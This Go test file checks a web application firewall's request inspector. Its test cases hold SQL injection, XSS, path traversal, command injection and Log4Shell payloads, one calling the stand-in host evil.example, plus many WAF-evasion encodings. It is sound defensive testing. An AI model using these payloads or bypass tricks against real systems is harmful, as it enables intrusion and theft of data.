package waf

import (
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

func TestInspectDetectsAttacks(t *testing.T) {
	tests := []struct {
		name      string
		req       func() *http.Request
		wantID    string
		wantLoc   Location
		wantField string
	}{
		{
			name:    "path traversal in path",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/static/..%2F..%2Fetc%2Fpasswd", nil) },
			wantID:  "PT-001",
			wantLoc: LocationPath,
		},
		{
			name: "sqli in query",
			req: func() *http.Request {
				return httptest.NewRequest("GET", "/items?id=1%20UNION%20SELECT%20password", nil)
			},
			wantID:  "SQLI-002",
			wantLoc: LocationQuery,
		},
		{
			name:    "sqli with plus and tabs in query",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/items?id=1+union%09%09select+1", nil) },
			wantID:  "SQLI-002",
			wantLoc: LocationQuery,
		},
		{
			name:    "double-encoded xss in query",
			req:     func() *http.Request { return httptest.NewRequest("GET", "/search?q=%253Cscript%253Ealert(1)", nil) },
			wantID:  "XSS-001",
			wantLoc: LocationQuery,
		},
		{
			name: "log4shell in header",
			req: func() *http.Request {
				r := httptest.NewRequest("GET", "/", nil)
				r.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
				return r
			},
			wantID:    "JNDI-001",
			wantLoc:   LocationHeader,
			wantField: "User-Agent",
		},
		{
			name: "xss in form body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/comment", strings.NewReader("text=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"))
				r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return r
			},
			wantID:  "XSS-003",
			wantLoc: LocationBody,
		},
		{
			name: "sqli in json body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/login", strings.NewReader(`{"user":"admin' OR '1'='1"}`))
				r.Header.Set("Content-Type", "application/json")
				return r
			},
			wantID:  "SQLI-001",
			wantLoc: LocationBody,
		},
	}

	in := mustInspector(t, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID || m.Location != tc.wantLoc || m.Field != tc.wantField {
				t.Errorf("got %s at %s (%q), want %s at %s (%q)",
					m.Signature.ID, m.Location, m.Field, tc.wantID, tc.wantLoc, tc.wantField)
			}
		})
	}
}

func TestInspectAllowsCleanRequests(t *testing.T) {
	in := mustInspector(t, 0)
	reqs := []*http.Request{
		httptest.NewRequest("GET", "/", nil),
		httptest.NewRequest("GET", "/products/42?sort=price&order=desc", nil),
		httptest.NewRequest("GET", "/search?q=select+a+union+representative", nil),
		httptest.NewRequest("POST", "/api/users", strings.NewReader(`{"name":"Alice","bio":"I like Go."}`)),
	}
	for _, r := range reqs {
		r.Header.Set("Accept", "*/*")
		r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64)")
		m, err := in.Inspect(r)
		if err != nil {
			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
		}
		if m != nil {
			t.Errorf("%s %s: unexpected match %s at %s", r.Method, r.URL, m.Signature.ID, m.Location)
		}
	}
}

func TestInspectRestoresBody(t *testing.T) {
	in := mustInspector(t, 0)
	r := httptest.NewRequest("POST", "/", strings.NewReader("hello"))
	if m, err := in.Inspect(r); err != nil || m != nil {
		t.Fatalf("Inspect = %v, %v", m, err)
	}
	b, _ := io.ReadAll(r.Body)
	if string(b) != "hello" {
		t.Errorf("body after inspection = %q, want %q", b, "hello")
	}
}

func TestInspectBodyTooLarge(t *testing.T) {
	in := mustInspector(t, 8)
	r := httptest.NewRequest("POST", "/", strings.NewReader("0123456789"))
	r.ContentLength = -1 // simulate a chunked request with unknown length
	if _, err := in.Inspect(r); !errors.Is(err, ErrBodyTooLarge) {
		t.Errorf("err = %v, want ErrBodyTooLarge", err)
	}
}

func TestMiddleware(t *testing.T) {
	var reached bool
	next := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		reached = true
		b, _ := io.ReadAll(r.Body)
		io.WriteString(w, string(b))
	})
	h := Middleware(next, mustInspector(t, 16), nil)

	tests := []struct {
		name        string
		req         *http.Request
		wantStatus  int
		wantReached bool
	}{
		{"clean", httptest.NewRequest("POST", "/", strings.NewReader("ok")), http.StatusOK, true},
		{"attack", httptest.NewRequest("GET", "/?q=<script>", nil), http.StatusForbidden, false},
		{"too large", httptest.NewRequest("POST", "/", strings.NewReader(strings.Repeat("a", 17))), http.StatusRequestEntityTooLarge, false},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			reached = false
			rec := httptest.NewRecorder()
			h.ServeHTTP(rec, tc.req)
			if rec.Code != tc.wantStatus {
				t.Errorf("status = %d, want %d", rec.Code, tc.wantStatus)
			}
			if reached != tc.wantReached {
				t.Errorf("next reached = %v, want %v", reached, tc.wantReached)
			}
			if tc.wantReached && rec.Body.String() != "ok" {
				t.Errorf("forwarded body = %q, want %q", rec.Body.String(), "ok")
			}
		})
	}
}

func TestInspectDetectsEvasion(t *testing.T) {
	tests := []struct {
		name   string
		req    func() *http.Request
		wantID string
	}{
		{"html entity xss in query", get("/?q=%26lt%3Bscript%26gt%3B"), "XSS-001"},
		{"%u-encoded xss in query", get("/?q=%u003Cscript%u003E"), "XSS-001"},
		{"fullwidth xss in query", get("/?q=%EF%BC%9Cscript%EF%BC%9E"), "XSS-001"},
		{"null byte in keyword", get("/?q=%3Cscr%00ipt%3E"), "XSS-001"},
		{"malformed escape before payload", get("/?q=%zz%3Cscript%3E"), "XSS-001"},
		{"sql comment as space", get("/items?id=1/**/UNION/**/SELECT/**/1"), "SQLI-002"},
		{"mysql versioned comment", get("/items?id=1+/*!50000UNION*/+/*!50000SELECT*/+1"), "SQLI-002"},
		{"overlong utf-8 traversal", get("/static/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"), "PT-001"},
		{"backslash traversal", get(`/download?file=..%5C..%5Cwindows%5Cwin.ini`), "PT-001"},
		{
			name: "js escape in json body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/api", strings.NewReader(`{"bio":"<script>alert(1)</script>"}`))
				r.Header.Set("Content-Type", "application/json")
				return r
			},
			wantID: "XSS-001",
		},
		{
			name: "html entity in header",
			req: func() *http.Request {
				r := httptest.NewRequest("GET", "/", nil)
				r.Header.Set("Referer", "&#x24;{jndi:ldap://evil.example/a}")
				return r
			},
			wantID: "JNDI-001",
		},
	}

	in := mustInspector(t, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID {
				t.Errorf("got %s at %s, want %s", m.Signature.ID, m.Location, tc.wantID)
			}
		})
	}
}

func TestInspectAllowsNormalizedCleanRequests(t *testing.T) {
	in := mustInspector(t, 0)
	reqs := []*http.Request{
		httptest.NewRequest("GET", "/login?next=https%3A%2F%2Fexample.com%2Fhome", nil),
		httptest.NewRequest("GET", "/search?q=%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF", nil),
		httptest.NewRequest("GET", "/docs/a.b/c..d", nil),
		httptest.NewRequest("POST", "/api", strings.NewReader(`{"text":"5 > 3 & 2 < 4"}`)),
	}
	for _, r := range reqs {
		r.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
		r.Header.Set("Authorization", "Basic dXNlcjpwYXNz+/==")
		m, err := in.Inspect(r)
		if err != nil {
			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
		}
		if m != nil {
			t.Errorf("%s %s: unexpected match %s at %s", r.Method, r.URL, m.Signature.ID, m.Location)
		}
	}
}

func get(target string) func() *http.Request {
	return func() *http.Request { return httptest.NewRequest("GET", target, nil) }
}

func mustInspector(t *testing.T, maxBodySize int64) *Inspector {
	t.Helper()
	in, err := NewInspector(DefaultSignatures, maxBodySize)
	if err != nil {
		t.Fatal(err)
	}
	return in
}

func TestInspectDetectsAdvancedEvasion(t *testing.T) {
	tests := []struct {
		name       string
		req        func() *http.Request
		wantID     string
		wantBase64 bool
	}{
		// Syntax-level rewrites
		{"union(select)", get("/items?id=1+UNION(SELECT+password+FROM+users)"), "SQLI-002", false},
		{"union distinct select", get("/items?id=1+UNION+DISTINCT+SELECT+1"), "SQLI-002", false},
		{"tautology with ||", get("/login?user=admin'||1=1"), "SQLI-001", false},
		{"tautology with like", get(`/login?user=x"+or+"a"+like+"a`), "SQLI-001", false},
		{"tautology with >", get("/login?user=x'+OR+2>1"), "SQLI-001", false},
		{"comment login bypass", get("/login?user=admin'--"), "SQLI-007", false},
		{"pg_sleep", get("/items?id=1;SELECT+pg_sleep(5)"), "SQLI-005", false},
		{"waitfor delay", get("/items?id=1;WAITFOR+DELAY+'0:0:5'"), "SQLI-005", false},
		{"svg onload", get("/?q=%3Csvg/onload%3Dalert(1)%3E"), "XSS-003", false},
		{"attribute breakout", get(`/?q="+onmouseover="x()`), "XSS-004", false},
		{"alert with backticks", get("/?q=alert`1`"), "XSS-006", false},
		{"javascript with tab", get("/?url=java%09script:x()"), "XSS-002", false},
		{"tomcat traversal", get("/app/..;/manager/html"), "PT-001", false},
		{"command after pipe", get("/ping?host=127.0.0.1|id"), "CMDI-001", false},
		{"command substitution", get("/ping?host=$(whoami)"), "CMDI-001", false},
		{"log4j nested lookups", hdr("User-Agent", "${${::-j}${lower:N}di:ldap://x/a}"), "JNDI-001", false},
		{"log4j env default", hdr("X-Api", "${${env:FOO:-j}ndi:ldap://x/a}"), "JNDI-001", false},

		// Keyword splitting
		{"split by sql comment", get("/items?id=1+UN/**/ION+SE/**/LECT+1"), "SQLI-002", false},
		{"split by string concat", get("/?q=top['al'%2B'ert'](1)"), "XSS-006", false},
		{"split by shell quotes", get("/ping?host=;c'a't+./config.php"), "CMDI-001", false},
		{"split by $@", get("/ping?host=;wh$@oami"), "CMDI-001", false},
		{"split by ${IFS}", get("/ping?host=;cat${IFS}./config.php"), "CMDI-001", false},
		{"split by caret", get("/ping?host=%26%26w^ho^ami"), "CMDI-001", false},

		// Base64
		{"base64 xss in query", get("/?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="), "XSS-001", true},
		{"base64 sqli in cookie", hdr("Cookie", "session=JyBPUiAnMSc9JzE="), "SQLI-001", true},
		{"base64url traversal", get("/download?f=Li4vLi4vZXRjL3Bhc3N3ZA"), "PT-001", true},
		{
			name: "base64 in json body",
			req: func() *http.Request {
				r := httptest.NewRequest("POST", "/api", strings.NewReader(`{"payload":"JHtqbmRpOmxkYXA6Ly9ldmlsLmV4YW1wbGUvYX0="}`))
				r.Header.Set("Content-Type", "application/json")
				return r
			},
			wantID: "JNDI-001", wantBase64: true,
		},
		{"base64 of url-encoded payload", get("/?d=JTNDc2NyaXB0JTNF"), "XSS-001", true},
	}

	in := mustInspector(t, 0)
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			m, err := in.Inspect(tc.req())
			if err != nil {
				t.Fatal(err)
			}
			if m == nil {
				t.Fatal("expected a match, got none")
			}
			if m.Signature.ID != tc.wantID || m.Base64 != tc.wantBase64 {
				t.Errorf("got %s (base64=%v) at %s, want %s (base64=%v)",
					m.Signature.ID, m.Base64, m.Location, tc.wantID, tc.wantBase64)
			}
		})
	}
}

func TestInspectFalsePositives(t *testing.T) {
	in := mustInspector(t, 0)
	reqs := []*http.Request{
		httptest.NewRequest("GET", "/products?category=books&sort=price&order=asc&page=2", nil),
		httptest.NewRequest("GET", "/search?q=trade+unions+and+selection+criteria", nil),
		httptest.NewRequest("GET", "/search?q=I+can't+sleep+at+night", nil),
		httptest.NewRequest("GET", "/search?q=onion+rings&online=true", nil),
		httptest.NewRequest("GET", "/search?q=cats+and+dogs;+id+cards", nil),
		httptest.NewRequest("GET", "/blog/2026/10/what's-new-in-go", nil),
		httptest.NewRequest("GET", "/files/report-final_v2.pdf", nil),
		httptest.NewRequest("GET", "/callback?code=4%2F0AX4XfWh7kQ&state=xyz123abc", nil),
		httptest.NewRequest("GET", "/static/js/vendor/jquery-3.7.1.min.js", nil),
		httptest.NewRequest("GET", "/users/550e8400-e29b-41d4-a716-446655440000", nil),
		httptest.NewRequest("GET", "/math?expr=a<b+and+c>d", nil),
		httptest.NewRequest("POST", "/api/comments", strings.NewReader(
			`{"author":"O'Brien","text":"Rock 'n' roll! 5 > 3 and \"quotes\" are fine.","tags":["go","waf"]}`)),
		httptest.NewRequest("POST", "/api/posts", strings.NewReader(
			`{"html":"<p class=\"intro\">Hello <b>world</b> <a href=\"/about\">about</a></p>"}`)),
	}
	for _, r := range reqs {
		r.Header.Set("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")
		r.Header.Set("Accept-Language", "ja,en-US;q=0.9,en;q=0.8")
		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36")
		r.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
		r.Header.Set("Cookie", "theme=dark; _ga=GA1.2.1234567890.1700000000; csrftoken=Zm9vYmFyYmF6cXV4")
		m, err := in.Inspect(r)
		if err != nil {
			t.Fatalf("%s %s: %v", r.Method, r.URL, err)
		}
		if m != nil {
			t.Errorf("%s %s: unexpected match %s at %s (field %q, base64=%v)",
				r.Method, r.URL, m.Signature.ID, m.Location, m.Field, m.Base64)
		}
	}
}

func TestNewInspectorValidatesSignatures(t *testing.T) {
	bad := [][]Signature{
		{{ID: "X", Pattern: "a", Regex: "a"}},
		{{ID: "X"}},
		{{ID: "X", Regex: "("}},
		{{ID: "X", Pattern: "a", Keywords: []string{"a"}}},
	}
	for _, sigs := range bad {
		if _, err := NewInspector(sigs, 0); err == nil {
			t.Errorf("NewInspector(%+v) succeeded, want error", sigs)
		}
	}
}

func hdr(name, value string) func() *http.Request {
	return func() *http.Request {
		r := httptest.NewRequest("GET", "/", nil)
		r.Header.Set(name, value)
		return r
	}
}

func BenchmarkInspect(b *testing.B) {
	in, err := NewInspector(DefaultSignatures, 0)
	if err != nil {
		b.Fatal(err)
	}
	largeBody := `{"items":[` + strings.Repeat(`{"id":12345,"name":"O'Brien's item","desc":"plain text description"},`, 1700) + `{}]}`
	benches := []struct {
		name string
		req  func() *http.Request
	}{
		{"typical GET", func() *http.Request {
			r := httptest.NewRequest("GET", "/products?category=books&sort=price&page=2", nil)
			r.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36")
			r.Header.Set("Cookie", "theme=dark; session=Zm9vYmFyYmF6cXV4")
			return r
		}},
		{"128KiB JSON body", func() *http.Request {
			return httptest.NewRequest("POST", "/api", strings.NewReader(largeBody))
		}},
	}
	for _, bc := range benches {
		b.Run(bc.name, func(b *testing.B) {
			for b.Loop() {
				if _, err := in.Inspect(bc.req()); err != nil {
					b.Fatal(err)
				}
			}
		})
	}
}

// BenchmarkInspectWorstCase measures a body that contains every signature
// keyword, so no prefilter can skip a regex, but matches no signature, so
// inspection cannot stop early.
func BenchmarkInspectWorstCase(b *testing.B) {
	in, err := NewInspector(DefaultSignatures, 0)
	if err != nil {
		b.Fatal(err)
	}
	var prefix strings.Builder
	for _, s := range DefaultSignatures {
		for _, k := range s.Keywords {
			// Skip keywords that are a complete match by themselves.
			word := "x" + k + "x "
			if m, _ := in.Inspect(httptest.NewRequest("POST", "/", strings.NewReader(word))); m == nil {
				prefix.WriteString(word)
			}
		}
	}
	filler := `{"id":12345,"name":"O'Brien's item","desc":"plain text description"},`
	body := prefix.String() + strings.Repeat(filler, (DefaultMaxBodySize-prefix.Len())/len(filler))

	if m, err := in.Inspect(httptest.NewRequest("POST", "/", strings.NewReader(body))); m != nil || err != nil {
		b.Fatalf("worst-case body must pass inspection, got %+v, %v", m, err)
	}
	b.SetBytes(int64(len(body)))
	for b.Loop() {
		in.Inspect(httptest.NewRequest("POST", "/", strings.NewReader(body)))
	}
}
